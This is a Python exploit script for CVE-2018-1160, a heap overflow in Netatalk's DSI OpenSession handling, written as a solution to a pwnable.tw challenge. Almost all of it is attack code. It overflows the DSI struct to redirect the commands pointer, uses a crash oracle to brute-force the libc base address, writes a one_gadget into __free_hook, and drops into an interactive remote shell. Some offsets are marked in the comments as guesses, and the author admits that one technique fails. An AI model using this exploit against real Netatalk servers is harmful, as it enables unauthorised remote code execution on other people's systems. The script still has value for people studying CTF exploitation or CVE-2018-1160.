#!/usr/bin/env python3
"""
CVE-2018-1160 Netatalk Remote Code Execution Exploit
pwnable.tw challenge

Vulnerability: Out-of-bounds write in dsi_opensess.c
The DSI OpenSession handler (dsi_opensession) has no proper bounds checking
when parsing client options. An oversized DSIOPT_ATTNQUANT option causes
a heap buffer overflow that overwrites critical DSI struct fields.

Overflow Target Fields (relative to options buffer):
+0x00: attn_quantum (4 bytes)
+0x04: datasize (4 bytes)
+0x08: server_quantum (4 bytes) - reflected back to client!
+0x0c: serverID (2 bytes)
+0x0e: clientID (2 bytes)
+0x10: commands (8 bytes) - pointer to DSI receive buffer (CRITICAL!)
+0x18: data buffer...

Exploitation Strategy:
1. Use byte-by-byte oracle to leak libc address (fork server preserves layout)
2. Overwrite 'commands' ptr to __free_hook - offset
3. Send DSI command that writes one_gadget/system to __free_hook
4. Trigger free() via dsi_close -> RCE

References:
- https://netatalk.io/security/CVE-2018-1160
- https://github.com/tenable/poc/tree/master/netatalk/cve_2018_1160
- https://shxdow.me/cve-2018-1160/
"""

import socket
import struct
import sys
import time

from pwn import *

context.arch = "amd64"
context.log_level = "info"

# ============================================================================
# Protocol Constants
# ============================================================================

# DSI Commands
DSI_CLOSESESSION = 0x01
DSI_COMMAND = 0x02
DSI_GETSTATUS = 0x03
DSI_OPENSESSION = 0x04
DSI_TICKLE = 0x05
DSI_WRITE = 0x06
DSI_ATTENTION = 0x08

# DSI Options
DSIOPT_ATTNQUANT = 0x01
DSIOPT_SERVQUANT = 0x00

# AFP Commands
AFP_LOGOUT = 0x14

# ============================================================================
# Libc Offsets (libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so)
# ============================================================================

LIBC_FREE_HOOK = 0x3ED8E8
LIBC_MALLOC_HOOK = 0x3EBC30
LIBC_SYSTEM = 0x4F440
LIBC_BINSH = 0x1B3E9A
LIBC_EXECVE = 0xE4E30

# One gadgets (constraints vary - may need to try multiple)
# Run: one_gadget libc.so
ONE_GADGETS = [
    0x4F2C5,  # execve("/bin/sh", rsp+0x40, environ)
    0x4F322,  # execve("/bin/sh", rsp+0x40, environ)
    0x10A38C,  # execve("/bin/sh", rsp+0x70, environ)
]

# ============================================================================
# DSI Protocol Handler
# ============================================================================


class DSI:
    """DSI Protocol implementation for Netatalk communication"""

    def __init__(self, host, port, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None
        self.req_id = 0

    def connect(self):
        """Establish TCP connection"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
        return True

    def disconnect(self):
        """Close connection"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None

    def send(self, data):
        """Send raw data"""
        self.sock.sendall(data)

    def recv(self, size=4096):
        """Receive data"""
        return self.sock.recv(size)

    def make_header(self, cmd, length, req_id=None, flags=0x00, err_offset=0):
        """
        Create 16-byte DSI header:
        - flags: 1 byte (0x00 = request, 0x01 = reply)
        - command: 1 byte
        - request_id: 2 bytes
        - error_code/data_offset: 4 bytes
        - total_data_length: 4 bytes
        - reserved: 4 bytes
        """
        if req_id is None:
            self.req_id += 1
            req_id = self.req_id
        return struct.pack(">BBHIII", flags, cmd, req_id, err_offset, length, 0)

    def recv_response(self, timeout=None):
        """Receive and parse DSI response"""
        if timeout:
            self.sock.settimeout(timeout)
        try:
            header = self.sock.recv(16)
            if len(header) < 16:
                return None

            flags, cmd, req_id, err_code, length, reserved = struct.unpack(
                ">BBHIII", header
            )

            data = b""
            while len(data) < length:
                chunk = self.sock.recv(min(length - len(data), 4096))
                if not chunk:
                    break
                data += chunk

            return {
                "flags": flags,
                "cmd": cmd,
                "req_id": req_id,
                "error": err_code,
                "length": length,
                "data": data,
            }
        except socket.timeout:
            return None
        except Exception as e:
            return None

    def open_session(self, options=b""):
        """Send DSI OpenSession with options"""
        hdr = self.make_header(DSI_OPENSESSION, len(options))
        self.send(hdr + options)
        return self.recv_response()

    def close_session(self):
        """Send DSI CloseSession"""
        hdr = self.make_header(DSI_CLOSESESSION, 0)
        self.send(hdr)

    def get_status(self):
        """Send DSI GetStatus (no auth required)"""
        hdr = self.make_header(DSI_GETSTATUS, 0)
        self.send(hdr)
        return self.recv_response()

    def send_command(self, afp_cmd, data=b""):
        """Send DSI Command (AFP command wrapper)"""
        payload = bytes([afp_cmd]) + data
        hdr = self.make_header(DSI_COMMAND, len(payload))
        self.send(hdr + payload)
        return self.recv_response()


# ============================================================================
# Exploit Functions
# ============================================================================


def build_overflow_options(target_addr):
    """
    Build malicious DSIOPT_ATTNQUANT option that overflows into DSI struct

    Based on Tenable's pea.py exploit - the struct layout is:
    +0x00: attn_quantum   (4 bytes)
    +0x04: datasize       (4 bytes)
    +0x08: server_quantum (4 bytes) - reflected in response!
    +0x0c: serverID       (2 bytes)
    +0x0e: clientID       (2 bytes)
    +0x10: commands       (8 bytes) - our target!

    Note: Values are stored in native (little) endian in the struct,
    but the memcpy copies raw bytes from the option data.
    """
    # Match Tenable's exact structure
    payload = b""
    payload += struct.pack("<I", 0x00040000)  # attn_quantum (little endian)
    payload += struct.pack("<I", 0x00100000)  # datasize
    payload += struct.pack("<I", 0xCAFEBABE)  # server_quantum
    payload += struct.pack("<I", 0x00010001)  # serverID + clientID as 4-byte value
    payload += struct.pack("<Q", target_addr)  # commands ptr (8 bytes, little endian)

    # Build as oversized DSIOPT_ATTNQUANT (type=0x01, len=24)
    option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
    return option


def build_overflow_options_v2(target_addr, quantum=0x00040000):
    """
    Alternative overflow structure - try different offsets.
    Maybe there's padding or different struct layout.
    """
    # Try with extra padding after clientID (for 8-byte alignment)
    payload = b""
    payload += struct.pack("<I", quantum)     # attn_quantum
    payload += struct.pack("<I", 0x00100000)  # datasize
    payload += struct.pack("<I", 0xCAFEBABE)  # server_quantum
    payload += struct.pack("<H", 0x0001)      # serverID
    payload += struct.pack("<H", 0x0001)      # clientID
    payload += struct.pack("<H", 0x0000)      # padding? (2 bytes)
    payload += struct.pack("<H", 0x0000)      # more padding? (2 bytes)
    payload += struct.pack("<Q", target_addr)  # commands ptr

    option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
    return option


def probe_address_valid(host, port, test_addr, timeout=3):
    """
    Test if address is writable using crash oracle technique.
    Fork server model: child crash = connection drops, valid = response received.

    IMPORTANT: The crash happens when we WRITE to the redirected commands pointer,
    not during the overflow itself. So we need to:
    1. Send overflow (redirects commands ptr)
    2. Send another packet WITH PAYLOAD (this writes to the redirected address)
    3. Check if we get a response (valid) or connection dies (invalid)
    """
    dsi = DSI(host, port, timeout)
    try:
        dsi.connect()

        # Step 1: Overflow to redirect commands ptr to test_addr
        options = build_overflow_options(test_addr)
        hdr = dsi.make_header(DSI_OPENSESSION, len(options))
        dsi.send(hdr + options)

        # Get response from overflow (should always succeed)
        resp1 = dsi.recv_response(timeout=timeout)
        if not resp1:
            return False

        # Step 2: Send a packet WITH PAYLOAD
        # The payload data will be written to test_addr (the redirected commands ptr)
        # If test_addr is invalid/unwritable, this causes a crash
        # Use DSI_COMMAND with a dummy AFP command byte + some padding
        payload = b"\x00" * 16  # 16 bytes of data to trigger write
        hdr2 = dsi.make_header(DSI_COMMAND, len(payload))
        dsi.send(hdr2 + payload)

        # Step 3: Try to get response - if we get one, address was valid (writable)
        # Use shorter timeout since crash should be immediate
        resp2 = dsi.recv_response(timeout=2)
        dsi.disconnect()

        return resp2 is not None

    except socket.timeout:
        # Timeout might mean crash or slow response
        return False
    except Exception as e:
        return False
    finally:
        dsi.disconnect()


def leak_address_byte_by_byte(host, port, high_byte_hint=0x7F):
    """
    Leak libc/heap address using byte-by-byte oracle.
    Fork server preserves memory layout across connections.

    Returns: 6-byte address (48-bit virtual address space)
    """
    log.info("Starting byte-by-byte address leak...")

    known = b""

    for pos in range(6):
        log.info(f"Bruting byte {pos}/5...")
        found = False
        attempts = 0

        # Optimize search order
        if pos == 5:
            # High byte: libc usually 0x7f, heap 0x55-0x56
            order = [high_byte_hint] + list(range(0x55, 0x58)) + list(range(256))
        else:
            order = list(range(256))

        for test in order:
            attempts += 1
            addr_bytes = known + bytes([test])
            # Pad to 8 bytes (high 2 bytes are 0x00)
            addr = u64(addr_bytes.ljust(8, b"\x00"))

            # Progress indicator every 16 attempts
            if attempts % 16 == 0:
                log.info(f"  Byte {pos}: tried {attempts}/256, current: 0x{test:02x}")

            if probe_address_valid(host, port, addr):
                known = addr_bytes
                log.success(f"Byte {pos}: 0x{test:02x} (addr so far: {hex(addr)}) after {attempts} attempts")
                found = True
                break

        if not found:
            log.warning(f"Failed at byte {pos} after {attempts} attempts")
            log.warning("This might mean the oracle technique doesn't work as expected")
            log.warning("Try running the exploit multiple times or check network connectivity")
            return None

    final_addr = u64(known.ljust(8, b"\x00"))
    log.success(f"Leaked address: {hex(final_addr)}")
    return final_addr


def bruteforce_libc_base(host, port):
    """
    Bruteforce libc base by probing __free_hook addresses.
    With ASLR, libc loads at 0x7fXXXXXXX000 (page aligned).
    We test if __free_hook at each candidate base is writable.

    On Linux x64, libc ASLR typically has ~12-16 bits of entropy.
    Libc addresses are usually 0x7fXXYYZZZ000 where:
    - XX is relatively fixed (often 0x00-0xff range in practice)
    - YY varies with ASLR
    - ZZZ varies with ASLR
    - Last 3 hex digits are 000 (page aligned)
    """
    log.info("Bruteforcing libc base address...")
    log.info("This may take a while (testing page-aligned addresses)...")

    attempts = 0
    max_attempts = 0x10000  # 65536 max attempts

    # Libc typically loads in high memory around 0x7f0000000000-0x7fffffffffff
    # Common patterns observed: 0x7fXX_YYYY_Z000
    # where XX is usually fixed per kernel, YYYY has 16-bit entropy

    # Start from middle of typical range and search outward
    # Try common libc ranges first
    start_ranges = [
        (0x7F00, 0x7FFF),  # Most common libc range
    ]

    for range_start, range_end in start_ranges:
        log.info(f"Searching range 0x{range_start:04x}00000000 - 0x{range_end:04x}ffffffff")

        # Iterate through high 16 bits of the address
        for high in range(range_start, range_end + 1):
            # For each high prefix, iterate through possible middle bytes
            # Libc size is ~2MB, so step by 0x200000 initially for speed
            for mid in range(0, 0x10000, 0x200):  # Step by ~2MB
                base = (high << 32) | (mid << 12)

                # Calculate where __free_hook would be
                free_hook = base + LIBC_FREE_HOOK
                target = free_hook - 0x10  # DSI header is 16 bytes

                # Skip obviously invalid ranges
                if free_hook > 0x7FFFFFFFFFFF:
                    continue

                if probe_address_valid(host, port, target):
                    log.success(f"Found valid candidate at attempt {attempts}!")
                    log.success(f"libc base: {hex(base)}")
                    log.success(f"__free_hook: {hex(free_hook)}")

                    # Refine search to find exact base (step by 0x1000)
                    for fine in range(-0x200, 0x200):
                        refined_base = base + (fine * 0x1000)
                        refined_hook = refined_base + LIBC_FREE_HOOK
                        if probe_address_valid(host, port, refined_hook - 0x10):
                            log.success(f"Refined libc base: {hex(refined_base)}")
                            return refined_base

                    return base

                attempts += 1
                if attempts % 500 == 0:
                    log.info(f"Attempt {attempts}... testing base {hex(base)}")

                if attempts >= max_attempts:
                    log.warning(f"Reached max attempts ({max_attempts})")
                    return None

    log.error("Bruteforce exhausted - no valid libc base found")
    return None


def do_exploit(host, port, libc_base, gadget_idx=0):
    """
    Execute full RCE exploit chain:
    1. Overflow commands ptr to __free_hook - 0x10
    2. Write one_gadget address via next DSI command
    3. Trigger free() via close
    """
    free_hook = libc_base + LIBC_FREE_HOOK
    system_addr = libc_base + LIBC_SYSTEM
    binsh_addr = libc_base + LIBC_BINSH
    one_gadget = libc_base + ONE_GADGETS[gadget_idx]

    log.info(f"libc base:   {hex(libc_base)}")
    log.info(f"__free_hook: {hex(free_hook)}")
    log.info(f"one_gadget:  {hex(one_gadget)}")
    log.info(f"system:      {hex(system_addr)}")
    log.info(f"/bin/sh:     {hex(binsh_addr)}")

    dsi = DSI(host, port, timeout=10)

    try:
        dsi.connect()
        log.success(f"Connected to {host}:{port}")

        # Step 1: Overflow commands ptr
        # Point to free_hook - 0x10 so our payload lands at free_hook
        target = free_hook - 0x10
        log.info(f"Step 1: Overflowing commands ptr to {hex(target)}")

        options = build_overflow_options(target)
        resp = dsi.open_session(options)

        if not resp:
            log.error("OpenSession failed - crash or timeout")
            return False

        log.success("Overflow successful - commands redirected!")

        # Parse response for info leak
        if resp.get("data"):
            log.info(f"Response data: {resp['data'].hex()}")

        # Step 2: Write one_gadget to __free_hook
        # Next write goes to controlled commands location
        # DSI header is 16 bytes, so payload starts at target + 0x10 = free_hook
        log.info("Step 2: Writing one_gadget to __free_hook...")

        # The payload written to commands will be: DSI header (parsed) + our data
        # After header parsing, data lands at commands + some_offset
        # We need to align so gadget address hits exactly at free_hook

        # Simple approach: send data that will be written at the target
        # The memcpy in dsi_stream_receive writes to commands buffer

        # Build payload: padding + gadget address
        # Exact offset may need adjustment based on DSI receive behavior
        payload = p64(one_gadget)  # Direct write attempt

        hdr = dsi.make_header(DSI_COMMAND, len(payload))
        dsi.send(hdr + payload)

        time.sleep(0.1)

        # Step 3: Trigger free by closing session
        log.info("Step 3: Triggering __free_hook via close...")
        dsi.close_session()

        # If successful, we should have a shell now
        log.info("Attempting to interact...")

        dsi.sock.settimeout(3)

        # Try sending a command
        dsi.sock.send(b"id\n")
        time.sleep(0.3)

        try:
            result = dsi.sock.recv(1024)
            if result:
                log.success(f"Got response: {result.decode(errors='ignore')}")

                # Drop into interactive shell
                log.info("Entering interactive mode...")
                while True:
                    try:
                        cmd = input("$ ")
                        if cmd.lower() in ["exit", "quit"]:
                            break
                        dsi.sock.send(cmd.encode() + b"\n")
                        time.sleep(0.3)
                        resp = dsi.sock.recv(4096)
                        print(resp.decode(errors="ignore"), end="")
                    except (EOFError, KeyboardInterrupt):
                        break
                return True
        except socket.timeout:
            log.warning("No response - shell may not have spawned")

    except Exception as e:
        log.error(f"Exploit failed: {e}")
        import traceback

        traceback.print_exc()

    finally:
        dsi.disconnect()

    return False


def recon(host, port):
    """Initial reconnaissance - get server info"""
    log.info("=== Reconnaissance ===")

    dsi = DSI(host, port)
    try:
        dsi.connect()

        # Get server status
        resp = dsi.get_status()
        if resp:
            data = resp["data"]
            log.info(f"Server status ({len(data)} bytes)")

            # Parse AFP server info
            if len(data) > 2:
                # Machine type offset
                machine_type_offset = struct.unpack(">H", data[0:2])[0]
                log.info(f"Machine type offset: {machine_type_offset}")

                if machine_type_offset < len(data):
                    # Extract server signature area
                    log.info(f"Data preview: {data[:64].hex()}")

    except Exception as e:
        log.error(f"Recon failed: {e}")
    finally:
        dsi.disconnect()


def test_overflow(host, port):
    """Debug function to test if overflow is working correctly"""
    log.info("=== Testing Overflow Mechanism ===")

    # Test 1: Normal OpenSession
    log.info("Test 1: Normal OpenSession (should succeed)")
    dsi = DSI(host, port, timeout=5)
    try:
        dsi.connect()
        option = bytes([DSIOPT_ATTNQUANT, 4]) + p32(0x00040000)
        hdr = dsi.make_header(DSI_OPENSESSION, len(option))
        dsi.send(hdr + option)
        resp = dsi.recv_response()
        if resp:
            log.success(f"Normal OpenSession: OK (got {resp['length']} bytes)")
            log.info(f"  Response: {resp['data'].hex()}")
        else:
            log.error("Normal OpenSession: FAILED (no response)")
            return False
    finally:
        dsi.disconnect()

    # Test 2: Incremental overflow to find where crash occurs
    log.info("Test 2: Incremental overflow size test...")
    log.info("  Layout: attn(4) + datasize(4) + server_quantum(4) + IDs(4) + commands(8)")

    for size in [4, 8, 12, 16, 20, 24]:
        dsi = DSI(host, port, timeout=3)
        try:
            dsi.connect()
            # Build payload incrementally with valid values
            payload = struct.pack("<I", 0x00040000)  # attn_quantum (4 bytes)
            if size >= 8:
                payload += struct.pack("<I", 0x00100000)  # datasize (4 bytes)
            if size >= 12:
                payload += struct.pack("<I", 0xCAFEBABE)  # server_quantum (4 bytes)
            if size >= 16:
                payload += struct.pack("<H", 0x0001)  # serverID (2 bytes)
                payload += struct.pack("<H", 0x0001)  # clientID (2 bytes)
            if size >= 20:
                # Partial commands pointer (just 4 bytes)
                payload += struct.pack("<I", 0x00000000)
            if size >= 24:
                # Full commands pointer (8 bytes total)
                payload += struct.pack("<I", 0x00000000)

            option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload

            hdr = dsi.make_header(DSI_OPENSESSION, len(option))
            dsi.send(hdr + option)
            resp = dsi.recv_response(timeout=2)

            status = "OK" if resp else "CRASH"
            log.info(f"  Size {size:2d} bytes: {status}")
        except Exception as e:
            log.info(f"  Size {size:2d} bytes: Exception - {e}")
        finally:
            dsi.disconnect()
        time.sleep(0.2)

    # Test 3: Try overflow with a high address (looks like valid libc range)
    log.info("Test 3: Overflow with high address (0x7f0000000000 range)")

    test_addrs = [
        0x0,                    # NULL
        0x7F0000000000,         # Low libc range
        0x7FFFFF000000,         # High libc range
        0x7F00003ED000,         # Near __free_hook range
    ]

    for addr in test_addrs:
        dsi = DSI(host, port, timeout=3)
        try:
            dsi.connect()
            options = build_overflow_options(addr)
            hdr = dsi.make_header(DSI_OPENSESSION, len(options))
            dsi.send(hdr + options)
            resp = dsi.recv_response(timeout=2)

            status = "OK (got response)" if resp else "CRASH (no response)"
            log.info(f"  commands=0x{addr:016x}: {status}")
        except Exception as e:
            log.info(f"  commands=0x{addr:016x}: Exception - {e}")
        finally:
            dsi.disconnect()
        time.sleep(0.2)

    # Test 4: Partial overwrite test - only modify low bytes of commands
    log.info("Test 4: Partial overwrite test (preserve high bytes)...")
    log.info("  If original commands is heap addr (0x55/0x56), partial overwrite might work")

    # Try overwriting just 1-4 bytes of commands with various values
    for num_bytes in [1, 2, 3, 4]:
        for test_val in [0x00, 0x10, 0x20, 0x00]:  # page-aligned offsets
            dsi = DSI(host, port, timeout=3)
            try:
                dsi.connect()
                payload = struct.pack("<I", 0x00040000)  # attn_quantum
                payload += struct.pack("<I", 0x00100000)  # datasize
                payload += struct.pack("<I", 0x00100000)  # server_quantum
                payload += struct.pack("<H", 0x0001)  # serverID
                payload += struct.pack("<H", 0x0001)  # clientID
                # Add partial commands overwrite
                for i in range(num_bytes):
                    payload += bytes([test_val])

                option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
                hdr = dsi.make_header(DSI_OPENSESSION, len(option))
                dsi.send(hdr + option)
                resp = dsi.recv_response(timeout=2)

                if resp:
                    log.success(f"  {num_bytes} bytes = 0x{test_val:02x}: OK!")
                    break
            except Exception as e:
                pass
            finally:
                dsi.disconnect()
            time.sleep(0.1)
        else:
            continue
        break  # Found working partial overwrite

    # Test 5: Test oracle technique with sample addresses
    log.info("Test 5: Testing probe_address_valid oracle...")
    for addr in [0x0, 0x7F0000000000, 0x7FFFFF000000]:
        result = probe_address_valid(host, port, addr)
        log.info(f"  probe(0x{addr:016x}) = {result}")
        time.sleep(0.2)

    log.info("=== Overflow test complete ===")
    log.info("")
    log.info("ANALYSIS:")
    log.info("  If all commands overwrites crash, the server writes reply to commands buffer.")
    log.info("  Potential solutions:")
    log.info("    1. Get libc base from another pwnable.tw challenge (as hint suggests)")
    log.info("    2. Brute force 12-16 bits of ASLR entropy")
    log.info("    3. Use partial overwrite if heap layout is predictable")
    return True


def main():
    host = "chall.pwnable.tw"
    port = 10002

    if len(sys.argv) >= 2:
        if sys.argv[1] == "local":
            host = "localhost"
            port = 5566
        elif sys.argv[1] == "test":
            # Test mode - verify overflow works
            test_overflow(host, port)
            return
        elif sys.argv[1] == "recon":
            # Recon only
            recon(host, port)
            return
        elif sys.argv[1] == "brute":
            # Direct brute force mode
            log.info(f"Target: {host}:{port}")
            log.info("Direct brute force mode")
            libc_base = bruteforce_libc_base(host, port)
            if libc_base:
                log.success(f"Found libc base: {hex(libc_base)}")
            return
        elif sys.argv[1].startswith("0x"):
            # Direct exploit with provided libc base
            libc_base = int(sys.argv[1], 16)
            log.info(f"Target: {host}:{port}")
            log.info(f"Using provided libc base: {hex(libc_base)}")
            for i in range(len(ONE_GADGETS)):
                log.info(f"Trying one_gadget {i}")
                if do_exploit(host, port, libc_base, i):
                    log.success("Exploit successful!")
                    return
                time.sleep(0.5)
            log.error("All gadgets failed")
            return

    log.info(f"Target: {host}:{port}")
    log.info("CVE-2018-1160 Netatalk RCE Exploit")
    log.info("=" * 50)

    # Step 1: Recon
    recon(host, port)

    # Step 2: Brute force libc base
    # The byte-by-byte oracle doesn't work well because addresses in the
    # 0x00-0xFF range are never valid. Instead, we brute force libc base directly.
    log.info("=== Address Discovery Phase ===")
    log.info("Bruteforcing libc base address...")
    log.info("Target: libc __free_hook (offset 0x%x)" % LIBC_FREE_HOOK)

    libc_base = bruteforce_libc_base(host, port)
    if not libc_base:
        log.error("Failed to find libc base")
        log.info("Try running: python3 exploit.py 0x<libc_base> with known base")
        return

    # Step 3: Exploit
    log.info("=== Exploitation Phase ===")
    log.info(f"libc base: {hex(libc_base)}")

    for i, gadget_offset in enumerate(ONE_GADGETS):
        log.info(f"Trying one_gadget {i}: offset {hex(gadget_offset)}")
        if do_exploit(host, port, libc_base, i):
            log.success("Exploit successful!")
            return
        log.warning(f"one_gadget {i} failed, trying next...")
        time.sleep(1)

    log.error("All one_gadgets failed")


if __name__ == "__main__":
    main()
